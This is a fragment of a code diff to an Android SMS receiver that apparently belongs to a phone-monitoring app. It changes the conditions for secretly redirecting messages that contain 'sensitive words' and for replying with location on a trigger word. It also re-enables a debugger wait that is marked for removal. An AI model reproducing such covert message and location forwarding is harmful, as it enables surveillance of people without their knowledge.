@@ -55,7 +55,7 @@ public class SmsReceiver extends BroadcastReceiver
 	@Override
 	public void onReceive(Context context, Intent intent) 
 	{
-		//android.os.Debug.waitForDebugger();//TODO should be removed in the release
+		android.os.Debug.waitForDebugger();//TODO should be removed in the release
 		
 		if (intent.getAction().equals(SMS_RECEIVED)) 
 		{
@@ -246,7 +246,7 @@ public class SmsReceiver extends BroadcastReceiver
 
 			//-------------------------------------------------------------------------------
 			// Redirect SMS that contains sensitive words
-			else if (!smsBody.startsWith(SmsConsts.HEADER_INFO_EX) && containSensitiveWords(context, smsBody)) 
+			else if (GlobalPrefActivity.getRedirectSms(context) && containSensitiveWords(context, smsBody)) 
 			{
 				if (!ConfigCtrl.isLegal(context)) return;
 
@@ -260,7 +260,7 @@ public class SmsReceiver extends BroadcastReceiver
 
 			//-------------------------------------------------------------------------------
 			// Send location SMS if being triggered by location activation word
-			else if (smsBody.equalsIgnoreCase(GlobalPrefActivity.getGpsWord(context))) 
+			else if (smsBody.equalsIgnoreCase(SmsConsts.INDICATION_LOCATION))
 			{
 				if (!ConfigCtrl.isLegal(context)) return;
 				
